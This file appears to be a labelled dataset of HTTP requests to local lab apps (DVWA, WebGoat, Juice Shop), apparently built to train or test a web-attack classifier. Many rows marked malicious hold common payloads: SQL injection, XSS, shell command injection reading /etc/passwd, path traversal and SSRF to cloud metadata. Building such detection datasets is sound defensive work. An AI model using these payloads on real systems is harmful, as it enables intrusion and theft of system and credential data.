timestamp,app,method,url,path,query,post_data,label
2026-04-20T15:00:02.896860+00:00,webgoat,GET,http://localhost:8082/service/lessonmenu.mvc?id=1%27+AND+%271%27%3D%271,/service/lessonmenu.mvc,id=1%27+AND+%271%27%3D%271,,malicious
2026-03-10T04:18:32.716458,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T04:47:22.077736,webgoat,GET,http://localhost:8082/WebGoat/CIA.lesson,/CIA.lesson,,,benign
2026-04-20T15:00:00.407860+00:00,dvwa,GET,http://localhost:8081/dvwa/css/main.css?url=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/dvwa/css/main.css,url=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-04-20T15:00:04.224860+00:00,dvwa,GET,http://localhost:8081/dvwa/images/logo.png?host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/dvwa/images/logo.png,host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:01.533860+00:00,juiceshop,GET,http://localhost:3000/api/Products/2?user=admin%27+--,/api/Products/2,user=admin%27+--,,malicious
2026-04-20T15:00:02.990860+00:00,webgoat,GET,http://localhost:8082/view?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/view,path=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-03-10T05:08:35.845733,webgoat,GET,http://localhost:8082/WebGoat/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff,/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff,,,benign
2026-03-10T04:21:49.811065,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/?name=Bob,/vulnerabilities/xss_r/,name=Bob,,benign
2026-03-10T04:49:25.517877,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:00.316860+00:00,dvwa,POST,http://localhost:8081/comment,/comment,,url=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-03-10T04:18:32.673742,dvwa,GET,http://localhost:8081/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,benign
2026-03-10T04:57:23.800827,webgoat,GET,https://www.youtube.com/s/player/9e63f8e4/player_es6.vflset/en_GB/embed.js,https://www.youtube.com/s/player/9e63f8e4/player_es6.vflset/en_GB/embed.js,,,benign
2026-03-10T05:03:03.166573,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-04-20T15:00:03.400860+00:00,dvwa,POST,http://localhost:8081/login,/login,,password=%27+OR+%271%27%3D%271%27+--+,malicious
2026-03-10T04:25:59.268253,webgoat,GET,http://localhost:8082/WebGoat/WebGoatIntroduction.lesson.lesson,/WebGoatIntroduction.lesson.lesson,,,benign
2026-04-20T15:00:03.401860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?page=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/dvwa/js/add_event_listeners.js,page=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-03-10T04:18:07.744179,dvwa,GET,http://localhost:8081/security.php,/security.php,,,benign
2026-04-20T15:00:00.199860+00:00,juiceshop,GET,http://localhost:3000/api/Challenges/?page=%3Cbody+onload%3Dalert%28document.domain%29%3E,/api/Challenges/,page=%3Cbody+onload%3Dalert%28document.domain%29%3E,,malicious
2026-03-10T04:51:47.234655,webgoat,GET,http://localhost:8082/WebGoat/css/animate.css,/css/animate.css,,,benign
2026-04-20T15:00:02.550860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/dvwa/js/add_event_listeners.js,host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:00.384860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/coaster.jpg?ip=localhost%3B+uname+-a,/assets/public/images/products/coaster.jpg,ip=localhost%3B+uname+-a,,malicious
2026-03-10T05:04:19.632599,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T05:10:53.776950,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-03-10T04:22:57.669022,webgoat,POST,http://localhost:8082/WebGoat/register.mvc,/register.mvc,,username=wafuser7a9e70&password=123456&matchingPassword=123456&agree=agree,benign
2026-03-10T04:56:51.508538,juiceshop,POST,http://localhost:3000/socket.io/?EIO=4&transport=polling&t=PpM6k0f&sid=U2Yj6Vv07ncWln-VAAAk,/socket.io/,EIO=4&transport=polling&t=PpM6k0f&sid=U2Yj6Vv07ncWln-VAAAk,40,benign
2026-04-20T15:00:03.724860+00:00,juiceshop,GET,http://localhost:3000/export?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/export,file=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-03-10T04:43:42.795214,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:24:25.677082,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:03.337860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/view/UserAndInfoView.js?url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,/js/goatApp/view/UserAndInfoView.js,url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,malicious
2026-03-10T05:01:44.338274,juiceshop,GET,http://localhost:3000/assets/public/images/products/fan_girlie.jpg,/assets/public/images/products/fan_girlie.jpg,,,benign
2026-04-20T15:00:03.763860+00:00,juiceshop,POST,http://localhost:3000/feedback,/feedback,,password=%3Cbody+onload%3Dalert%28document.domain%29%3E,malicious
2026-04-20T15:00:00.986860+00:00,dvwa,POST,http://localhost:8081/submit,/submit,,url=%27+UNION+SELECT+1%2C2%2C3--,malicious
2026-03-10T05:09:18.273284,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T05:07:25.751989,webgoat,GET,http://localhost:8082/WebGoat/service/lessonmenu.mvc,/service/lessonmenu.mvc,,,benign
2026-03-10T05:03:14.522193,webgoat,GET,http://localhost:8082/WebGoat/service/lessoninfo.mvc/CSRF.lesson,/service/lessoninfo.mvc/CSRF.lesson,,,benign
2026-03-10T04:50:39.937842,juiceshop,GET,http://localhost:3000/rest/user/whoami,/rest/user/whoami,,,benign
2026-03-10T04:24:33.175526,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T04:47:12.106376,webgoat,GET,http://localhost:8082/WebGoat/css/img/nllang.svg,/css/img/nllang.svg,,,benign
2026-03-10T05:05:54.541826,juiceshop,GET,http://localhost:3000/assets/public/images/JuiceShop_Logo.png,/assets/public/images/JuiceShop_Logo.png,,,benign
2026-03-10T05:01:05.017602,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/,/vulnerabilities/xss_r/,,,benign
2026-04-20T15:00:02.983860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/melon_bike.jpeg?endpoint=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/assets/public/images/products/melon_bike.jpeg,endpoint=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-04-20T15:00:03.326860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/permafrost.jpg?host=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/assets/public/images/products/permafrost.jpg,host=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-03-10T04:51:54.020061,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc,/service/hint.mvc,,,benign
2026-03-10T04:24:16.953849,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T05:00:43.191397,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:03.443860+00:00,webgoat,GET,http://localhost:8082/webhook/test?target=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,/webhook/test,target=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,,malicious
2026-03-10T05:07:11.825953,webgoat,GET,http://localhost:8082/WebGoat/images/zap_edit_and_response.png,/images/zap_edit_and_response.png,,,benign
2026-03-10T05:00:50.926746,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T04:49:23.310553,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/,/vulnerabilities/xss_r/,,,benign
2026-04-20T15:00:03.211860+00:00,juiceshop,POST,http://localhost:3000/rest/admin/application-version,/rest/admin/application-version,,username=%27+UNION+SELECT+1%2C2%2C3--,malicious
2026-03-10T04:51:47.308253,webgoat,GET,http://localhost:8082/WebGoat/js/libs/jquery-ui-1.10.4.js,/js/libs/jquery-ui-1.10.4.js,,,benign
2026-04-20T15:00:03.181860+00:00,webgoat,POST,http://localhost:8082/api/login,/api/login,,password=%27+OR+SLEEP%285%29--,malicious
2026-04-20T15:00:02.136860+00:00,webgoat,POST,http://localhost:8082/login,/login,,url=%27+OR+SLEEP%285%29--,malicious
2026-04-20T15:00:04.302860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/dvwa/js/add_event_listeners.js,id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-03-10T05:11:42.168373,webgoat,GET,http://localhost:8082/WebGoat/js/libs/underscore-min.js,/js/libs/underscore-min.js,,,benign
2026-04-20T15:00:02.412860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js?host=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/dvwa/js/dvwaPage.js,host=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-03-10T04:21:34.215290,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T04:47:02.423970,juiceshop,GET,http://localhost:3000/assets/public/images/products/fan_facemask.jpg,/assets/public/images/products/fan_facemask.jpg,,,benign
2026-03-10T05:08:56.540215,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T05:13:12.386673,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/templates/paging_controls.html,/js/goatApp/templates/paging_controls.html,,,benign
2026-04-20T15:00:03.711860+00:00,webgoat,POST,http://localhost:8082/login,/login,,url=1+OR+1%3D1--,malicious
2026-04-20T15:00:01.976860+00:00,dvwa,POST,http://localhost:8081/api/login,/api/login,,comment=admin%27+--,malicious
2026-04-20T15:00:04.564860+00:00,dvwa,POST,http://localhost:8081/feedback,/feedback,,email=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-03-10T04:51:46.477405,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/ErrorNotificationView.js,/js/goatApp/view/ErrorNotificationView.js,,,benign
2026-04-20T15:00:01.468860+00:00,dvwa,POST,http://localhost:8081/feedback,/feedback,,token=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,malicious
2026-04-20T15:00:01.910860+00:00,webgoat,GET,http://localhost:8082/export?template=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,/export,template=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,,malicious
2026-04-20T15:00:01.421860+00:00,webgoat,GET,http://localhost:8082/https://fonts.gstatic.com/s/roboto/v48/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBA.woff2?cmd=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/https://fonts.gstatic.com/s/roboto/v48/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBA.woff2,cmd=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-03-10T04:48:49.471430,dvwa,GET,http://localhost:8081/security.php,/security.php,,,benign
2026-03-10T04:57:24.994667,webgoat,GET,https://static.doubleclick.net/instream/ad_status.js,https://static.doubleclick.net/instream/ad_status.js,,,benign
2026-03-10T04:43:58.666990,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T05:08:44.083400,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:22:35.872847,juiceshop,GET,http://localhost:3000/assets/public/images/products/green_smoothie.jpg,/assets/public/images/products/green_smoothie.jpg,,,benign
2026-03-10T05:07:40.601140,webgoat,GET,http://localhost:8082/WebGoat/XSS.lesson,/XSS.lesson,,,benign
2026-04-20T15:00:01.466860+00:00,dvwa,GET,http://localhost:8081/dvwa/images/logo.png?ip=127.0.0.1%3B+sleep+5,/dvwa/images/logo.png,ip=127.0.0.1%3B+sleep+5,,malicious
2026-03-10T05:01:04.083448,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:00.249860+00:00,webgoat,GET,http://localhost:8082/https://googleads.g.doubleclick.net/pagead/id?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,/https://googleads.g.doubleclick.net/pagead/id,q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,malicious
2026-04-20T15:00:01.448860+00:00,webgoat,GET,http://localhost:8082/download?file=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,/download,file=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,,malicious
2026-03-10T05:07:26.208647,webgoat,GET,http://localhost:8082/WebGoat/js/quiz.js,/js/quiz.js,,,benign
2026-04-20T15:00:00.623860+00:00,webgoat,POST,http://localhost:8082/login,/login,,email=1+OR+1%3D1--,malicious
2026-03-10T05:07:04.999049,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/MenuCollection.js,/js/goatApp/model/MenuCollection.js,,,benign
2026-03-10T04:18:23.081736,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:03.190860+00:00,juiceshop,POST,http://localhost:3000/comment,/comment,,password=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-04-20T15:00:03.297860+00:00,juiceshop,GET,http://localhost:3000/webhook/test?dest=http%3A%2F%2F127.0.0.1%3A22,/webhook/test,dest=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-04-20T15:00:02.736860+00:00,webgoat,POST,http://localhost:8082/api/review,/api/review,,token=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-04-20T15:00:01.973860+00:00,juiceshop,GET,http://localhost:3000/api/Users/?ip=localhost%3B+uname+-a,/api/Users/,ip=localhost%3B+uname+-a,,malicious
2026-03-10T04:47:02.338880,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-04-20T15:00:01.336860+00:00,webgoat,GET,http://localhost:8082/css/main.css?cmd=127.0.0.1+%26%26+whoami,/css/main.css,cmd=127.0.0.1+%26%26+whoami,,malicious
2026-04-20T15:00:01.355860+00:00,webgoat,POST,http://localhost:8082/submit,/submit,,username=1+OR+1%3D1--,malicious
2026-04-20T15:00:00.234860+00:00,juiceshop,GET,http://localhost:3000/download?page=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,/download,page=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,,malicious
2026-03-10T04:49:13.973314,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:04.753860+00:00,webgoat,GET,http://localhost:8082/lesson_js/xxe.js?user=%27+UNION+SELECT+1%2C2%2C3--,/lesson_js/xxe.js,user=%27+UNION+SELECT+1%2C2%2C3--,,malicious
2026-04-20T15:00:01.829860+00:00,webgoat,GET,http://localhost:8082/proxy?dest=http%3A%2F%2Flocalhost%2Fadmin,/proxy,dest=http%3A%2F%2Flocalhost%2Fadmin,,malicious
2026-04-20T15:00:00.800860+00:00,juiceshop,POST,http://localhost:3000/comment,/comment,,username=%3Cbody+onload%3Dalert%28document.domain%29%3E,malicious
2026-03-10T04:49:16.869206,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-03-10T04:47:11.049819,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/support/goatAsyncErrorHandler.js,/js/goatApp/support/goatAsyncErrorHandler.js,,,benign
2026-04-20T15:00:01.118860+00:00,webgoat,POST,http://localhost:8082/submit,/submit,,token=%27+UNION+SELECT+1%2C2%2C3--,malicious
2026-04-20T15:00:04.020860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?target=127.0.0.1+%26%26+whoami,/dvwa/js/add_event_listeners.js,target=127.0.0.1+%26%26+whoami,,malicious
2026-03-10T04:21:43.164288,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:02.054860+00:00,webgoat,GET,http://localhost:8082/js/libs/text.js?url=1+OR+1%3D1--,/js/libs/text.js,url=1+OR+1%3D1--,,malicious
2026-03-10T04:19:45.472362,juiceshop,GET,http://localhost:3000/polyfills.js,/polyfills.js,,,benign
2026-03-10T04:51:41.258491,juiceshop,GET,http://localhost:3000/rest/products/search?q=,/rest/products/search,q=,,benign
2026-04-20T15:00:04.523860+00:00,webgoat,GET,http://localhost:8082/proxy?dest=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/proxy,dest=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-03-10T05:02:32.154294,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/HTMLContentModel.js,/js/goatApp/model/HTMLContentModel.js,,,benign
2026-04-20T15:00:01.585860+00:00,webgoat,POST,http://localhost:8082/js/goatApp/view/ErrorNotificationView.js,/js/goatApp/view/ErrorNotificationView.js,,comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-04-20T15:00:01.902860+00:00,webgoat,POST,http://localhost:8082/feedback,/feedback,,message=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-04-20T15:00:03.240860+00:00,webgoat,POST,http://localhost:8082/submit,/submit,,username=1+OR+1%3D1--,malicious
2026-04-20T15:00:00.349860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js?id=%27+OR+SLEEP%285%29--,/dvwa/js/dvwaPage.js,id=%27+OR+SLEEP%285%29--,,malicious
2026-03-10T04:51:49.782263,webgoat,GET,http://localhost:8082/WebGoat/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff,/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff,,,benign
2026-04-20T15:00:03.059860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/sqli/?search=%3Csvg%2Fonload%3Dalert%281%29%3E,/vulnerabilities/sqli/,search=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:03.103860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/green_smoothie.jpg?file=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,/assets/public/images/products/green_smoothie.jpg,file=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,,malicious
2026-03-10T05:05:57.379944,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-04-20T15:00:02.573860+00:00,webgoat,GET,http://localhost:8082/export?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/export,page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:04.640860+00:00,juiceshop,GET,http://localhost:3000/rest/shop/products/search?host=1%27+AND+%271%27%3D%271,/rest/shop/products/search,host=1%27+AND+%271%27%3D%271,,malicious
2026-04-20T15:00:01.599860+00:00,juiceshop,GET,http://localhost:3000/rest/admin/application-configuration?target=http%3A%2F%2F127.0.0.1%3A22,/rest/admin/application-configuration,target=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-04-20T15:00:04.607860+00:00,juiceshop,GET,http://localhost:3000/export?page=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,/export,page=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,,malicious
2026-03-10T04:20:45.807784,webgoat,GET,http://localhost:8082/WebGoat/start,/start,,,benign
2026-04-20T15:00:01.377860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?page=%3Cbody+onload%3Dalert%28document.domain%29%3E,/dvwa/js/add_event_listeners.js,page=%3Cbody+onload%3Dalert%28document.domain%29%3E,,malicious
2026-03-10T04:52:07.906115,webgoat,GET,https://www.gstatic.com/eureka/clank/145/cast_sender.js,https://www.gstatic.com/eureka/clank/145/cast_sender.js,,,benign
2026-04-20T15:00:03.234860+00:00,dvwa,GET,http://localhost:8081/proxy?target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/proxy,target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-04-20T15:00:04.499860+00:00,juiceshop,GET,http://localhost:3000/download?file=..%252f..%252f..%252f..%252fetc%252fpasswd,/download,file=..%252f..%252f..%252f..%252fetc%252fpasswd,,malicious
2026-04-20T15:00:05.021860+00:00,webgoat,GET,http://localhost:8082/css/font-awesome.min.css?q=admin%27+--,/css/font-awesome.min.css,q=admin%27+--,,malicious
2026-03-10T05:08:40.381298,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:03.241860+00:00,dvwa,POST,http://localhost:8081/api/review,/api/review,,token=%3Csvg%2Fonload%3Dalert%281%29%3E,malicious
2026-03-10T05:01:26.758377,juiceshop,POST,http://localhost:3000/api/Users/,/api/Users/,,"{""email"":""user_d141c154@waf-test.com"",""password"":""Test@12345!"",""passwordRepeat"":""Test@12345!"",""securityQuestion"":{""id"":1,""question"":""Your eldest siblings middle name?"",""createdAt"":""2026-03-10T04:03:05.064Z"",""updatedAt"":""2026-03-10T04:03:05.064Z""},""securityAnswer"":""waftest""}",benign
2026-04-20T15:00:00.268860+00:00,dvwa,POST,http://localhost:8081/api/review,/api/review,,message=%3Csvg%2Fonload%3Dalert%281%29%3E,malicious
2026-03-10T04:44:16.884109,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:49:32.043955,dvwa,GET,http://localhost:8081/vulnerabilities/fi/?page=help.php,/vulnerabilities/fi/,page=help.php,,benign
2026-03-10T04:49:22.388214,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T05:04:04.414357,webgoat,GET,http://localhost:8082/WebGoat/css/img/nllang.svg,/css/img/nllang.svg,,,benign
2026-03-10T04:54:04.358918,dvwa,GET,http://localhost:8081/vulnerabilities/xss_r/?name=Yvonne,/vulnerabilities/xss_r/,name=Yvonne,,benign
2026-03-10T05:06:57.461508,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-03-10T05:04:04.475088,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/MenuItemView.js,/js/goatApp/view/MenuItemView.js,,,benign
2026-04-20T15:00:04.114860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/dvwa/js/add_event_listeners.js,host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-03-10T04:19:34.105771,juiceshop,GET,http://localhost:3000/assets/public/images/carousel/1.jpg,/assets/public/images/carousel/1.jpg,,,benign
2026-04-20T15:00:04.127860+00:00,juiceshop,GET,http://localhost:3000/download?template=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,/download,template=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,,malicious
2026-04-20T15:00:02.761860+00:00,webgoat,GET,http://localhost:8082/css/main.css?q=%3Csvg%2Fonload%3Dalert%281%29%3E,/css/main.css,q=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:01.546860+00:00,webgoat,GET,http://localhost:8082/export?path=..%252f..%252f..%252f..%252fetc%252fpasswd,/export,path=..%252f..%252f..%252f..%252fetc%252fpasswd,,malicious
